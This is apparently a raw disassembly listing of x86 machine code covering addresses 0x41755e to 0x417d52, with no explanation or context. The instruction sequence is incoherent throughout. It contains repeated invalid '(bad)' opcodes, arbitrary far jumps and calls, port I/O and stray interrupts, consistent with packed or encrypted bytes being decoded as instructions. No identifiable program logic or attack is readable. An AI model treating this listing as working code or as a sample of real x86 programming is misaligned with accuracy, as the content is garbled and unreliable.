  41755e:	cmp    al,0xc7
  417560:	ja     0x41758d
  417562:	adc    bh,bh
  417564:	pushf  
  417565:	pop    edx
  417566:	dec    ebp
  417567:	dec    esi
  417568:	cmp    eax,0x86a67b03
  41756d:	and    al,0xe6
  41756f:	sbb    DWORD PTR [ecx],0xffffff82
  417572:	or     BYTE PTR [edi],cl
  417574:	sbb    eax,0xb7c4337c
  417579:	int    0x55
  41757b:	adc    BYTE PTR [ecx+0x4f],dh
  41757e:	adc    bh,0xfd
  417581:	outs   dx,DWORD PTR ds:[esi]
  417582:	js     0x4175fd
  417584:	imul   esi,DWORD PTR [ecx+0x24],0xc02c10d5
  41758b:	rcr    BYTE PTR [esi],1
  41758d:	loope  0x417573
  41758f:	or     edi,edi
  417591:	je     0x4175b6
  417593:	xchg   edi,eax
  417594:	lea    ecx,[esi+0x4bd80af]
  41759a:	cmp    eax,0x3fe76be
  41759f:	mov    esi,0xddee67c
  4175a4:	push   es
  4175a5:	sar    dh,1
  4175a7:	or     BYTE PTR [edx-0x36858706],al
  4175ad:	or     al,0xe
  4175af:	and    ecx,DWORD PTR [eax]
  4175b1:	comiss xmm4,DWORD PTR [ebx+0x4d0513e3]
  4175b8:	push   ebx
  4175b9:	pusha  
  4175ba:	aas    
  4175bb:	mov    DWORD PTR [esi-0x1],eax
  4175be:	lahf   
  4175bf:	dec    esi
  4175c0:	cmp    esp,DWORD PTR [ebp-0x7a]
  4175c3:	sbb    BYTE PTR cs:[ecx-0x226c4e04],dl
  4175ca:	ror    dl,0x6a
  4175cd:	mov    al,ds:0x9db9ff94
  4175d2:	int    0xe5
  4175d4:	sub    ch,bl
  4175d6:	loopne 0x4175a1
  4175d8:	and    al,BYTE PTR [eax-0x4e751930]
  4175de:	adc    eax,0x373a7033
  4175e3:	out    0x8d,eax
  4175e5:	jecxz  0x417617
  4175e7:	jmp    0x6fab:0x708ec73c
  4175ee:	mov    ebp,0x36e25b62
  4175f3:	lahf   
  4175f4:	test   DWORD PTR [ecx+0x3a],edi
  4175f7:	pop    ebp
  4175f8:	pop    ebx
  4175f9:	jecxz  0x417677
  4175fb:	mov    gs,edx
  4175fd:	jmp    0xfab4:0xe474d2e4
  417604:	retf   0x13f4
  417607:	popf   
  417608:	les    eax,FWORD PTR [ebp-0x69]
  41760b:	call   0x4b3d4aef
  417610:	repz sub BYTE PTR [ebx+eax*2-0x6575d452],bl
  417618:	or     al,0x7
  41761a:	sti    
  41761b:	and    al,0x6e
  41761d:	add    ah,BYTE PTR [edx]
  41761f:	imul   esi,DWORD PTR [edi+0x1da11edd],0x22
  417626:	xchg   ebp,eax
  417627:	pop    eax
  417628:	add    DWORD PTR [edx+0x8cf7bb2],0xfffffffb
  41762f:	mov    bl,0x5e
  417631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417632:	mov    bh,0x1a
  417634:	call   0xd583:0x72b19ec8
  41763b:	mov    edx,0x6fd250c
  417640:	out    0x42,al
  417642:	push   edi
  417643:	dec    edi
  417644:	ss out 0x7b,eax
  417647:	push   eax
  417648:	cmp    ah,BYTE PTR [edi+0x4ae17903]
  41764e:	int    0xc5
  417650:	pop    ebx
  417651:	fwait
  417652:	mov    ch,0xab
  417654:	jge    0x417629
  417656:	imul   edx,DWORD PTR [edi-0x7ce54836],0x49
  41765d:	dec    edi
  41765e:	jmp    0x4176be
  417660:	add    al,0x22
  417662:	cmc    
  417663:	sub    BYTE PTR [eax-0x18a5daaa],0x82
  41766a:	push   0xffffffdf
  41766c:	pop    esp
  41766d:	push   ecx
  41766e:	int    0x80
  417670:	jp     0x4175f3
  417672:	add    dl,BYTE PTR [esi-0x46]
  417675:	fs ds mov ebx,0xaff85954
  41767c:	call   0x48d5:0xa0dc4e1e
  417683:	pop    ds
  417684:	aas    
  417685:	outs   dx,DWORD PTR ds:[esi]
  417686:	arpl   WORD PTR [esi+ecx*1-0x1d],si
  41768a:	mov    WORD PTR [ebx-0x42],es
  41768d:	std    
  41768e:	shl    DWORD PTR [ecx],1
  417690:	and    DWORD PTR [esi],ebx
  417692:	add    dh,dl
  417694:	aas    
  417695:	(bad)  
  417696:	cld    
  417697:	enter  0x69d3,0x4d
  41769b:	add    esi,DWORD PTR [esi+eiz*1+0x32d9db58]
  4176a2:	add    cl,dh
  4176a4:	push   cs
  4176a5:	loop   0x41771f
  4176a7:	adc    al,0xe5
  4176a9:	add    BYTE PTR [edx-0x1b],0x74
  4176ad:	popa   
  4176ae:	and    al,BYTE PTR [ecx+ecx*1-0x55]
  4176b2:	ficomp WORD PTR [ecx]
  4176b4:	call   0x340:0x5a061b3f
  4176bb:	call   FWORD PTR [ebp-0x70]
  4176be:	shr    ebp,cl
  4176c0:	and    eax,0x1e441a80
  4176c5:	cld    
  4176c6:	pop    ebx
  4176c7:	inc    esp
  4176c8:	pop    edx
  4176c9:	mov    bh,0x1e
  4176cb:	js     0x417718
  4176cd:	das    
  4176ce:	or     bl,dh
  4176d0:	outs   dx,DWORD PTR ds:[esi]
  4176d1:	cmp    BYTE PTR [edi],ah
  4176d3:	xchg   ebx,eax
  4176d4:	add    al,0x2a
  4176d6:	cwde   
  4176d7:	sbb    BYTE PTR [ebx],ch
  4176d9:	loopne 0x417690
  4176db:	lods   al,BYTE PTR ds:[esi]
  4176dc:	xchg   ebx,eax
  4176dd:	xor    al,cl
  4176df:	pop    es
  4176e0:	iret   
  4176e1:	loope  0x41767a
  4176e3:	adc    bl,BYTE PTR [edx+ebp*1]
  4176e6:	ja     0x417697
  4176e8:	fisubr DWORD PTR [ebx+0x2a95accf]
  4176ee:	mov    bh,0xb4
  4176f0:	bound  eax,QWORD PTR [ecx+0x8449f8f]
  4176f6:	fwait
  4176f7:	mov    bl,0x9e
  4176f9:	dec    edi
  4176fa:	rcr    BYTE PTR [ebx-0x2a9f6f6b],cl
  417700:	adc    al,cl
  417702:	imul   edi,DWORD PTR [ecx+ebp*1+0x6c41fe54],0xaa9ee129
  41770d:	pop    eax
  41770e:	mov    edx,0xb6a1bb0
  417713:	pop    ds
  417714:	push   0xffffff97
  417716:	outs   dx,BYTE PTR ds:[esi]
  417717:	adc    edx,ecx
  417719:	out    0x6b,al
  41771b:	push   es
  41771c:	div    edx
  41771e:	mov    cl,0x86
  417720:	dec    ebp
  417721:	neg    DWORD PTR [ecx+esi*2]
  417724:	add    dl,BYTE PTR [esi+0x7cd0142b]
  41772a:	mov    edx,0x2dd73455
  41772f:	(bad)  
  417730:	jnp    0x4176df
  417732:	retf   0x3140
  417735:	push   ss
  417736:	sbb    DWORD PTR [eax],esi
  417738:	and    al,0x61
  41773a:	jmp    0x4176c9
  41773c:	enter  0x56e1,0x9f
  417740:	call   0xbdd404b6
  417745:	xchg   ecx,eax
  417746:	mov    ds:0x9ba3768a,al
  41774b:	mov    cl,0xc
  41774d:	fst    DWORD PTR [ebx-0x737f3b23]
  417753:	out    0xda,al
  417755:	cld    
  417756:	lods   eax,DWORD PTR ds:[esi]
  417757:	sahf   
  417758:	sti    
  417759:	jae    0x417700
  41775b:	xchg   DWORD PTR [eax-0x49],edx
  41775e:	cmc    
  41775f:	aaa    
  417760:	xor    al,0x8a
  417762:	addr16 hlt 
  417764:	jb     0x41776c
  417766:	test   al,0xa7
  417768:	dec    edi
  417769:	pop    ss
  41776a:	jae    0x417784
  41776c:	sub    ecx,ebx
  41776e:	inc    esi
  41776f:	ret    0xa46a
  417772:	push   0xffffff8b
  417774:	sub    al,0x7b
  417776:	cdq    
  417777:	mov    bh,BYTE PTR [ecx]
  417779:	or     cl,BYTE PTR [esi-0xd62977a]
  41777f:	dec    ebx
  417780:	mov    dh,0xfe
  417782:	shl    BYTE PTR [ebp-0x6d],0x44
  417786:	scas   al,BYTE PTR es:[edi]
  417787:	je     0x4177ba
  417789:	arpl   WORD PTR [eax],ax
  41778b:	pop    ebp
  41778c:	push   es
  41778d:	xchg   ecx,eax
  41778e:	jno    0x41775a
  417790:	aam    0xd6
  417792:	pop    esp
  417793:	or     DWORD PTR [edi+0x6fbef1d5],esi
  417799:	adc    BYTE PTR [edx-0xc],cl
  41779c:	loop   0x41778e
  41779e:	ret    
  41779f:	xchg   ebx,eax
  4177a0:	or     bl,bl
  4177a2:	sbb    BYTE PTR [esi-0x21d67870],dh
  4177a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177a9:	outs   dx,BYTE PTR ds:[esi]
  4177aa:	test   BYTE PTR [ebx+0x344a411c],ch
  4177b0:	push   eax
  4177b1:	mov    ah,0xcf
  4177b3:	jp     0x417818
  4177b5:	pop    ss
  4177b6:	jg     0x417822
  4177b8:	ret    0x27e1
  4177bb:	test   al,0x59
  4177bd:	mov    fs,WORD PTR [ebp+0x614d178e]
  4177c3:	hlt    
  4177c4:	xor    edx,DWORD PTR [eax-0x78]
  4177c7:	sub    edi,DWORD PTR ds:0x39cc598f
  4177cd:	and    eax,0xd9671a1a
  4177d2:	(bad)  
  4177d3:	retf   0xba18
  4177d6:	fiadd  WORD PTR [ebp+ebp*4+0x21dd5d97]
  4177dd:	cmp    DWORD PTR [ebp-0x2a],ebx
  4177e0:	push   ebp
  4177e1:	cmp    DWORD PTR [esi-0x2ecec251],0x11eba0b3
  4177eb:	sahf   
  4177ec:	int3   
  4177ed:	scas   al,BYTE PTR es:[edi]
  4177ee:	and    DWORD PTR [edi],ecx
  4177f0:	ror    BYTE PTR [edx-0x6a],cl
  4177f3:	inc    ebp
  4177f4:	inc    edi
  4177f5:	loop   0x4177c3
  4177f7:	fadd   QWORD PTR [ecx-0x72]
  4177fa:	add    eax,0x293e54ed
  4177ff:	mov    ch,0x8
  417801:	pop    esp
  417802:	sbb    DWORD PTR [ecx-0x7e],0xa20ec8f9
  417809:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41780b:	pop    ebp
  41780c:	pusha  
  41780d:	leave  
  41780e:	sbb    al,0x12
  417810:	adc    bh,cl
  417812:	or     esi,0x34447ee5
  417818:	in     al,0xbd
  41781a:	sub    eax,0x8228b3b6
  41781f:	add    dh,BYTE PTR [edi+0x22]
  417822:	sub    al,0xb1
  417824:	in     eax,0x29
  417826:	stos   DWORD PTR es:[edi],eax
  417827:	cmp    edi,DWORD PTR [edx+ecx*8]
  41782a:	xchg   edi,eax
  41782b:	dec    esp
  41782c:	jb     0x417870
  41782e:	xchg   DWORD PTR [edi],edi
  417830:	push   esp
  417831:	dec    edi
  417832:	inc    ebp
  417833:	dec    edx
  417834:	mov    eax,ds:0x54f93d08
  417839:	das    
  41783a:	dec    ebp
  41783b:	and    eax,0x3475f3f9
  417840:	pop    edi
  417841:	inc    edi
  417842:	or     DWORD PTR [eax-0x4545fec4],ebx
  417848:	data16 aam 0xce
  41784b:	(bad)  
  41784c:	in     eax,dx
  41784d:	in     al,0x28
  41784f:	xor    edx,DWORD PTR [ebx+eiz*4]
  417852:	xor    BYTE PTR ds:0x58c9feb9,ah
  417858:	and    BYTE PTR ds:0x6e1aeed6,0x70
  41785f:	jns    0x417878
  417861:	dec    ebp
  417862:	push   es
  417863:	and    BYTE PTR [esi+0x28303c82],bh
  417869:	fadd   DWORD PTR [ebp-0x3815f0a9]
  41786f:	dec    ebx
  417870:	in     eax,dx
  417871:	sbb    edx,esp
  417873:	lock or BYTE PTR [edi+0x2281b166],bh
  41787a:	sar    BYTE PTR [eax],0x71
  41787d:	push   0x59
  41787f:	pop    esp
  417880:	ss push 0xa
  417883:	int    0xa8
  417885:	idiv   DWORD PTR [esi+0x75]
  417888:	jle    0x41783d
  41788a:	aam    0x24
  41788c:	into   
  41788d:	test   eax,0xf31b4b8
  417892:	xchg   ebx,eax
  417893:	pusha  
  417894:	jge    0x41790b
  417896:	jg     0x41787a
  417898:	mov    es:0x4c7eef22,al
  41789e:	xor    cl,BYTE PTR ds:0x16e1ab25
  4178a4:	mov    eax,ds:0xd21cdb5f
  4178a9:	sti    
  4178aa:	add    DWORD PTR [ebp+0x73],esp
  4178ad:	pop    edx
  4178ae:	fldcw  WORD PTR [edx-0x54]
  4178b1:	out    dx,al
  4178b2:	cmp    BYTE PTR [edi+0xbb0a628],0x79
  4178b9:	xchg   esp,ebx
  4178bb:	xor    BYTE PTR [ebx-0xaadab39],0x9c
  4178c2:	fisttp DWORD PTR [edx+0x66]
  4178c5:	ins    DWORD PTR es:[edi],dx
  4178c6:	mov    esi,0x1e36256d
  4178cb:	mov    eax,ds:0xf38bfe04
  4178d0:	sbb    esp,DWORD PTR [eax-0xa6fb7cf]
  4178d6:	xor    al,0x97
  4178d8:	push   es
  4178d9:	mov    ah,0x37
  4178db:	rcl    DWORD PTR [edi+edi*8-0x772743b2],1
  4178e2:	stos   DWORD PTR es:[edi],eax
  4178e3:	scas   eax,DWORD PTR es:[edi]
  4178e4:	xor    eax,0x15b2e344
  4178e9:	jle    0x4178ec
  4178eb:	xchg   esp,eax
  4178ec:	xchg   DWORD PTR [eax-0x32],ecx
  4178ef:	(bad)  
  4178f0:	xchg   ebx,eax
  4178f1:	sbb    eax,0x4af667f7
  4178f6:	mov    ds:0xb37ed1dd,al
  4178fb:	jbe    0x4178e4
  4178fd:	jp     0x417907
  4178ff:	pop    eax
  417900:	in     eax,0x51
  417902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417903:	jl     0x417921
  417905:	or     al,0x7b
  417907:	sub    esi,DWORD PTR [ebx-0xfa55bbe]
  41790d:	sub    DWORD PTR [ebp-0x13],esp
  417910:	pop    es
  417911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417912:	inc    esi
  417913:	mov    al,0xb4
  417915:	xchg   BYTE PTR [edx+0x49],al
  417918:	xchg   BYTE PTR ds:0x95a57879,al
  41791e:	xor    eax,0x27187527
  417923:	ds ins DWORD PTR es:[edi],dx
  417925:	mov    al,dh
  417927:	mov    dh,0x5d
  417929:	cld    
  41792a:	xlat   BYTE PTR ds:[ebx]
  41792b:	push   ebp
  41792c:	inc    esp
  41792d:	sbb    eax,0x832d43b7
  417932:	cdq    
  417933:	stos   BYTE PTR es:[edi],al
  417934:	sti    
  417935:	fcmovne st,st(2)
  417937:	xor    eax,0x4b8433c2
  41793c:	xchg   ebx,eax
  41793d:	jns    0x41793e
  41793f:	inc    edx
  417940:	cmp    cl,ch
  417942:	jmp    0x5276e046
  417947:	test   esp,0x6b7579ef
  41794d:	cmp    al,0xd4
  41794f:	jne    0x417964
  417951:	ret    
  417952:	sub    BYTE PTR [edi],0x41
  417955:	mov    eax,0xdda41ee4
  41795a:	cld    
  41795b:	imul   DWORD PTR [ebx-0x71]
  41795e:	add    DWORD PTR [ebx-0x39fa9afb],0x1e993a69
  417968:	or     ecx,edi
  41796a:	jecxz  0x4179ea
  41796c:	dec    esi
  41796d:	or     al,0x61
  41796f:	imul   eax,DWORD PTR [edx-0x6b],0xe150abdd
  417976:	cs daa 
  417978:	test   BYTE PTR [ebp+0x63c5c203],bh
  41797e:	sbb    eax,0xcfd43d1c
  417983:	push   ss
  417984:	jecxz  0x4179e1
  417986:	and    bh,ch
  417988:	mov    eax,0xfa84630e
  41798e:	push   esp
  41798f:	mov    WORD PTR [eax-0x70ffe107],ds
  417995:	fimul  WORD PTR [edi-0xb897d19]
  41799b:	pop    ecx
  41799c:	xor    ecx,eax
  41799e:	fcmovu st,st(7)
  4179a0:	daa    
  4179a1:	inc    edx
  4179a2:	push   ds
  4179a3:	sub    esp,DWORD PTR [edi]
  4179a5:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4179a7:	inc    ecx
  4179a8:	mov    cl,0xb3
  4179aa:	sbb    DWORD PTR [esi],0xf77a7fc6
  4179b0:	mov    bl,0xfb
  4179b2:	mov    WORD PTR [eax-0x78f0660d],?
  4179b8:	ror    cl,1
  4179ba:	es xor al,ch
  4179bd:	and    eax,0x67516ac9
  4179c2:	push   0x350b1fc8
  4179c7:	xchg   BYTE PTR ds:0x740901c3,ah
  4179cd:	mov    BYTE PTR [esi+0x58],bh
  4179d0:	xor    al,0x94
  4179d2:	push   ebx
  4179d3:	stc    
  4179d4:	dec    esi
  4179d5:	adc    BYTE PTR [eax-0x71f7862a],dl
  4179db:	cmp    BYTE PTR [ebp+0x67],bl
  4179de:	clc    
  4179df:	add    DWORD PTR [esi],edx
  4179e1:	popf   
  4179e2:	sub    BYTE PTR [edi-0x4c934bf5],0xd2
  4179e9:	sub    dh,dh
  4179eb:	xor    esp,DWORD PTR [edi-0x51]
  4179ee:	mov    DWORD PTR [ebx+0xd],eax
  4179f1:	mov    eax,ds:0x2823a0f2
  4179f6:	out    0x7,eax
  4179f8:	adc    ecx,DWORD PTR [edx]
  4179fa:	(bad)  
  4179fb:	and    eax,0x30a68551
  417a00:	(bad)  
  417a02:	push   ebp
  417a03:	pop    esp
  417a05:	xchg   ebp,eax
  417a06:	or     DWORD PTR [esp+ebx*1+0x33],esi
  417a0a:	jb     0x417a01
  417a0c:	mov    ecx,0x10caa84d
  417a11:	daa    
  417a12:	rcl    DWORD PTR [esi+0x65e3250c],0x28
  417a19:	mov    edi,0xd2ddb204
  417a1e:	fadd   DWORD PTR [eax-0x76643564]
  417a24:	retf   0xf4bc
  417a27:	cmp    dh,BYTE PTR [ebp-0x124e3169]
  417a2d:	mov    edx,0x47b1d6df
  417a32:	bound  ebx,QWORD PTR [ecx]
  417a34:	sub    DWORD PTR [eax+0x5430d17e],0x2b
  417a3b:	lea    ebp,[eax]
  417a3d:	pop    edx
  417a3e:	cmp    eax,0x6b71fe40
  417a43:	mov    ah,BYTE PTR [esi+0x5bbaf458]
  417a49:	(bad)  
  417a4a:	push   esi
  417a4b:	mov    dl,0xf6
  417a4d:	sub    ecx,0x7d0c68ed
  417a53:	mov    edi,0xaf87f22a
  417a58:	in     eax,0xb1
  417a5a:	mov    eax,0xe7d0a478
  417a5f:	inc    edi
  417a60:	inc    eax
  417a61:	xor    dh,BYTE PTR [esi+0x6982d325]
  417a67:	aam    0xc3
  417a69:	mov    dh,ah
  417a6b:	mov    ah,0xb1
  417a6d:	sub    BYTE PTR [ecx+0x550cb97e],ch
  417a73:	(bad)  
  417a74:	cdq    
  417a75:	fstp   DWORD PTR [esi]
  417a77:	das    
  417a78:	fcmovnbe st,st(6)
  417a7a:	mov    ecx,0x2da38c91
  417a7f:	xchg   esp,eax
  417a80:	aad    0xf4
  417a82:	sub    eax,0xe5ac4109
  417a87:	mov    ebx,0x5c9357ee
  417a8c:	xchg   ebp,eax
  417a8d:	push   ecx
  417a8e:	stos   BYTE PTR es:[edi],al
  417a8f:	out    0x36,eax
  417a91:	nop
  417a92:	pop    ds
  417a93:	pop    esp
  417a94:	mul    BYTE PTR [edi+ebx*4]
  417a97:	pop    edi
  417a98:	mov    ch,0xc6
  417a9a:	dec    esi
  417a9b:	es adc eax,0x1fcdb8b3
  417aa1:	push   ebx
  417aa2:	push   edx
  417aa3:	adc    eax,0x20bd7c8d
  417aa8:	lods   al,BYTE PTR ds:[esi]
  417aa9:	push   esi
  417aaa:	sub    DWORD PTR [eax+0x1a4e249],eax
  417ab0:	push   0x9f1036ec
  417ab5:	lods   al,BYTE PTR ds:[esi]
  417ab6:	or     al,0x6f
  417ab8:	pop    ebx
  417ab9:	jae    0x417aeb
  417abb:	cmp    bl,BYTE PTR [ebx]
  417abd:	lds    edx,FWORD PTR [edi]
  417abf:	lds    ebx,FWORD PTR [ecx+0x7]
  417ac2:	shr    BYTE PTR [ecx+0x35],0x7c
  417ac6:	test   esp,0x9d63258d
  417acc:	lahf   
  417acd:	push   ss
  417ace:	aaa    
  417acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ad0:	(bad)
  417ad3:	addr16 addr16 jmp 0x417ab5
  417ad7:	jae    0x417a6d
  417ad9:	imul   esp,ebp,0xfffffff5
  417adc:	dec    ebp
  417add:	xchg   DWORD PTR [edi],edx
  417adf:	pop    es
  417ae0:	ror    BYTE PTR [edi-0x58],0x52
  417ae4:	es sti 
  417ae6:	scas   eax,DWORD PTR es:[edi]
  417ae7:	sbb    dh,al
  417ae9:	mov    edi,0xffd2fc7e
  417aee:	aas    
  417aef:	cmp    eax,0x5a787c91
  417af4:	das    
  417af5:	test   BYTE PTR [edx+esi*1],bl
  417af8:	push   edi
  417af9:	stos   BYTE PTR es:[edi],al
  417afa:	inc    ebx
  417afb:	lea    esp,[esi-0xd8a0af6]
  417b01:	test   ebx,edx
  417b03:	ja     0x417b59
  417b05:	lock cmp ebp,esi
  417b08:	pop    ebp
  417b09:	rcr    BYTE PTR [ebp+0x5addf123],0x2
  417b10:	sahf   
  417b11:	es sahf 
  417b13:	(bad)  [edi]
  417b15:	or     BYTE PTR [edi],dl
  417b17:	cmp    eax,0x79daee61
  417b1c:	fnstenv [edx+ecx*8]
  417b1f:	push   ecx
  417b20:	jb     0x417b14
  417b22:	mov    dl,0x93
  417b24:	(bad)  
  417b25:	xchg   ebp,eax
  417b26:	sbb    eax,0xf43208fc
  417b2b:	into   
  417b2c:	dec    edi
  417b2d:	inc    esi
  417b2e:	pop    esi
  417b2f:	loop   0x417ac2
  417b31:	push   esp
  417b32:	iret   
  417b33:	push   ebp
  417b34:	pop    ebx
  417b35:	xchg   ebx,eax
  417b36:	aas    
  417b37:	inc    ecx
  417b38:	inc    esp
  417b39:	jmp    0x417b33
  417b3b:	pusha  
  417b3c:	xchg   esp,eax
  417b3d:	adc    al,0x19
  417b3f:	loope  0x417b31
  417b41:	adc    BYTE PTR [esi-0x11],bl
  417b44:	dec    esp
  417b45:	mov    ebp,0xe7b3d6eb
  417b4a:	xor    ebp,DWORD PTR [edi+ebx*1]
  417b4d:	call   0xf2f6:0x29ef754f
  417b54:	repnz mov al,0xea
  417b57:	and    ebx,edx
  417b59:	in     eax,dx
  417b5a:	jno    0x417b54
  417b5c:	xor    al,0x2c
  417b5e:	paddw  mm1,mm7
  417b61:	add    bl,BYTE PTR [edx]
  417b63:	xchg   ebx,eax
  417b64:	cli    
  417b65:	pop    ebp
  417b66:	fcom   st(7)
  417b68:	out    0x28,eax
  417b6a:	rcr    DWORD PTR [edi+0x53f3fe1d],cl
  417b70:	sahf   
  417b71:	jae    0x417b67
  417b73:	cli    
  417b74:	push   ss
  417b75:	xchg   esi,eax
  417b76:	cdq    
  417b77:	out    0xb4,eax
  417b79:	shl    ebp,1
  417b7b:	(bad)  
  417b7c:	in     eax,0xba
  417b7e:	push   edi
  417b7f:	out    dx,eax
  417b80:	pop    eax
  417b81:	adc    ecx,DWORD PTR ds:0x86b4f8aa
  417b87:	ss push ebx
  417b89:	(bad)  
  417b8a:	(bad)  
  417b8c:	fisttp WORD PTR [esi+eax*2+0x45]
  417b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b91:	xor    al,0xb1
  417b93:	jnp    0x417bb1
  417b95:	daa    
  417b96:	cmp    al,0x2a
  417b98:	mov    al,ds:0xaa24023c
  417b9d:	or     eax,0x6234035c
  417ba2:	xchg   esi,eax
  417ba3:	sbb    al,0x37
  417ba5:	fwait
  417ba6:	sbb    cl,dh
  417ba8:	mov    bl,0xa9
  417baa:	shl    DWORD PTR ds:0xd3b766f2,cl
  417bb0:	sbb    al,0x46
  417bb2:	daa    
  417bb3:	test   eax,0x627fb056
  417bb8:	mov    eax,ds:0xba1d96ed
  417bbd:	sub    DWORD PTR [esi+0x3da45eeb],esi
  417bc3:	aad    0x79
  417bc5:	fwait
  417bc6:	nop
  417bc7:	ret    
  417bc8:	in     al,dx
  417bc9:	sub    al,0x36
  417bcb:	mov    ah,0xe9
  417bcd:	enter  0x6d4e,0xb9
  417bd1:	xchg   ecx,eax
  417bd2:	push   edx
  417bd3:	repz add edi,DWORD PTR [esi+edi*4-0x60ce948c]
  417bdb:	jbe    0x417b7d
  417bdd:	mov    dl,0x47
  417bdf:	pop    ecx
  417be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417be1:	ins    DWORD PTR es:[edi],dx
  417be2:	xor    al,0xe9
  417be4:	push   ss
  417be5:	pop    eax
  417be6:	and    eax,0x2e7623ea
  417beb:	sahf   
  417bec:	lahf   
  417bed:	inc    edi
  417bee:	fs in  al,0x7d
  417bf1:	and    al,0x5
  417bf3:	inc    ebp
  417bf4:	in     eax,0x1
  417bf6:	xor    ah,BYTE PTR [ecx+0x32]
  417bf9:	adc    eax,0xa8d1256d
  417bfe:	jns    0x417c76
  417c00:	push   esp
  417c01:	dec    esi
  417c02:	inc    ebp
  417c03:	mov    eax,ds:0x8d292e2e
  417c08:	jmp    0x417ba2
  417c0a:	mov    WORD PTR [ebx],?
  417c0c:	int3   
  417c0d:	int3   
  417c0e:	or     al,0xc0
  417c10:	jmp    0x2f3859bd
  417c15:	xchg   DWORD PTR [esi],esp
  417c17:	cli    
  417c18:	adc    dh,cl
  417c1a:	cmp    bh,0x84
  417c1d:	call   0x7ef8df20
  417c22:	icebp  
  417c23:	test   eax,0x622a2d69
  417c28:	hlt    
  417c29:	addr16 push es
  417c2b:	jb     0x417c01
  417c2d:	call   0xa425fbed
  417c32:	mov    dl,0xe
  417c34:	push   ecx
  417c35:	sub    DWORD PTR [eax-0x25],ebx
  417c38:	sbb    eax,0x1c0d25f9
  417c3d:	mov    ds:0xb7eb2353,eax
  417c42:	add    BYTE PTR [eax],ch
  417c44:	xchg   ebx,eax
  417c45:	mov    ebp,0x876c34cb
  417c4a:	mov    al,BYTE PTR [edi+0x7c61fecb]
  417c50:	mov    ds:0x8925c1b5,eax
  417c55:	sbb    ah,0xf9
  417c58:	cdq    
  417c59:	pop    ecx
  417c5a:	aam    0x20
  417c5c:	mov    edx,0xce2d3209
  417c61:	mov    dl,0x4b
  417c63:	cmp    al,0x7f
  417c65:	shr    bl,0x85
  417c68:	(bad)  
  417c69:	push   edi
  417c6a:	xchg   esp,eax
  417c6b:	sub    eax,0x6fad54
  417c70:	sbb    BYTE PTR [esi+0x4ed3e4cd],0x6e
  417c77:	outs   dx,DWORD PTR ds:[esi]
  417c78:	test   DWORD PTR [eax],ecx
  417c7a:	mov    BYTE PTR [ebx],ah
  417c7c:	push   eax
  417c7d:	and    al,0xc4
  417c7f:	nop
  417c80:	in     eax,dx
  417c81:	mov    esp,0xef36b0b7
  417c86:	adc    al,0xe4
  417c88:	push   ss
  417c89:	mov    ch,0xcc
  417c8b:	retf   
  417c8c:	mov    ebx,edx
  417c8e:	pusha  
  417c8f:	cmp    DWORD PTR [edx],ecx
  417c91:	loopne 0x417cbc
  417c93:	ret    
  417c94:	pop    eax
  417c95:	push   eax
  417c96:	sub    eax,0x3798a0f5
  417c9b:	push   ebx
  417c9c:	mov    cl,0x82
  417c9e:	loop   0x417c5e
  417ca0:	in     al,dx
  417ca1:	popw   es
  417ca3:	and    dl,dl
  417ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ca7:	cmp    DWORD PTR [esi+0x75],0x76
  417cab:	das    
  417cac:	inc    edi
  417cad:	dec    ebp
  417cae:	lods   eax,DWORD PTR ds:[esi]
  417caf:	and    esi,ebp
  417cb1:	dec    edi
  417cb2:	popf   
  417cb3:	xor    DWORD PTR [ebx+0x25],0x4aa0bb97
  417cba:	and    esp,ebx
  417cbc:	xor    eax,DWORD PTR [esi-0x24]
  417cbf:	rcl    DWORD PTR [edx+0x77],0x62
  417cc3:	and    al,0xb
  417cc5:	xor    dl,ah
  417cc7:	imul   edx,DWORD PTR [esp+esi*2],0xc
  417ccb:	pop    edi
  417ccc:	and    edx,DWORD PTR [edx]
  417cce:	cmp    cl,BYTE PTR [ebx]
  417cd0:	adc    BYTE PTR [eax],bl
  417cd2:	sahf   
  417cd3:	shl    BYTE PTR [edx-0x3e],0x79
  417cd7:	mov    edx,0x65fc383e
  417cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cdd:	sub    al,0x20
  417cdf:	push   ecx
  417ce0:	push   ecx
  417ce1:	sub    ebx,DWORD PTR [esi-0x15]
  417ce4:	aaa    
  417ce5:	and    al,0xdb
  417ce7:	std    
  417ce8:	and    eax,0x92f7b661
  417ced:	cmp    ch,0x2e
  417cf0:	mov    ebp,DWORD PTR [edi-0x22]
  417cf3:	push   esp
  417cf4:	push   ss
  417cf5:	sub    al,bl
  417cf7:	dec    eax
  417cf8:	pop    edi
  417cf9:	test   ch,0x31
  417cfc:	or     eax,DWORD PTR [eax]
  417cfe:	test   DWORD PTR ds:[eax-0x41],0x499942fd
  417d06:	adc    ecx,DWORD PTR [ebx-0x5a]
  417d09:	jge    0x417cfe
  417d0b:	js     0x417d67
  417d0d:	push   ebp
  417d0e:	dec    esi
  417d0f:	dec    DWORD PTR ds:0xa98865d6
  417d15:	retf   
  417d16:	cmp    DWORD PTR [eax],esp
  417d18:	gs loop 0x417d3e
  417d1b:	js     0x417ca6
  417d1d:	aad    0xc9
  417d1f:	(bad)  
  417d20:	mov    eax,ds:0x9793e86b
  417d25:	push   esp
  417d26:	cs icebp 
  417d28:	push   ds
  417d29:	test   al,0x2f
  417d2b:	sbb    BYTE PTR [ebx+0x7ad93a9d],dh
  417d31:	ds jo  0x417d56
  417d34:	inc    edx
  417d35:	pop    edx
  417d36:	mov    ?,WORD PTR [esi+0x2a]
  417d39:	cmp    DWORD PTR [edx-0x27],esi
  417d3c:	nop
  417d3d:	and    BYTE PTR [edi],al
  417d3f:	inc    esp
  417d40:	jnp    0x417d5b
  417d42:	or     bl,BYTE PTR [esi-0x22eee276]
  417d48:	(bad)  
  417d49:	jne    0x417d93
  417d4b:	push   ebp
  417d4c:	mov    esp,0x930da251
  417d51:	push   ebp
  417d52:	call   FWORD PTR [ebx+0x74]
